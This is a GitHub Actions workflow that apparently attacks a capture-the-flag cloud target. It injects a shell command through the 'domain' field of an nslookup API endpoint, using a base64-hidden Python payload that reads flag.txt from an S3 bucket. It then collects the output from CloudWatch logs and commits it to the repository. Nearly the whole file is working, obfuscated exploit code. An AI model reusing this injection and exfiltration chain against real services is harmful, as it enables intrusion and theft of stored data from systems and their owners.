name: recon

on:
  push:
    branches:
      - corgi
  workflow_dispatch:

permissions:
  id-token: write
  contents: write

jobs:
  recon:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repo
        uses: actions/checkout@v4
        with:
          token: ${{ github.token }}

      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Inject flag-print script and read via CloudWatch
        run: |
          # Python script: prints flag as hex to stdout (captured by Lambda logger)
          B64_PRINT="aW1wb3J0IGJvdG8zLHN5cwpmbGFnPWJvdG8zLmNsaWVudCgnczMnKS5nZXRfb2JqZWN0KEJ1Y2tldD0nY29kZWM0ZjI2Yzg2MmEzMjFlZjUnLEtleT0nZmxhZy50eHQnKVsnQm9keSddLnJlYWQoKQpwcmludCgnRkxBR0hFWDonK2ZsYWcuaGV4KCkpCnN5cy5zdGRvdXQuZmx1c2goKQ=="

          INJECT="x; echo $B64_PRINT | base64 -d | python3 #"
          python3 -c "import json,sys; print(json.dumps({'domain': sys.argv[1]}))" "$INJECT" > payload.json
          curl -s -X POST https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
            -H "Content-Type: application/json" -d @payload.json > /dev/null

          echo "Waiting 8s for CloudWatch log propagation..."
          sleep 8

          # Read CloudWatch logs for the Lambda
          LOG_GROUP="/aws/lambda/nslookupv2"
          echo "=== CloudWatch log streams (latest first) ==="
          aws logs describe-log-streams \
            --log-group-name "$LOG_GROUP" \
            --order-by LastEventTime \
            --descending \
            --limit 3 \
            --query 'logStreams[*].{name:logStreamName,last:lastEventTimestamp}' \
            --output json || echo "Cannot read log streams"

          echo "=== Filtering for FLAGHEX pattern ==="
          aws logs filter-log-events \
            --log-group-name "$LOG_GROUP" \
            --filter-pattern "FLAGHEX" \
            --start-time $(( $(date +%s) * 1000 - 120000 )) \
            --query 'events[*].message' \
            --output json 2>&1 | tee /tmp/cw_result.txt

          cat /tmp/cw_result.txt

          echo "=== Most recent log events ==="
          STREAM=$(aws logs describe-log-streams \
            --log-group-name "$LOG_GROUP" \
            --order-by LastEventTime \
            --descending \
            --limit 1 \
            --query 'logStreams[0].logStreamName' \
            --output text 2>/dev/null)
          echo "Latest stream: $STREAM"
          if [ "$STREAM" != "None" ] && [ -n "$STREAM" ]; then
            aws logs get-log-events \
              --log-group-name "$LOG_GROUP" \
              --log-stream-name "$STREAM" \
              --limit 20 \
              --query 'events[*].message' \
              --output json 2>&1
          fi

      - name: Commit CloudWatch results
        run: |
          cp /tmp/cw_result.txt cloudwatch_result.txt 2>/dev/null || echo "(empty)" > cloudwatch_result.txt
          git config user.email "bot@github-actions"
          git config user.name "GitHub Actions"
          git add cloudwatch_result.txt
          git commit -m "cloudwatch flag extraction result [skip ci]" || echo "Nothing to commit"
          git push origin corgi
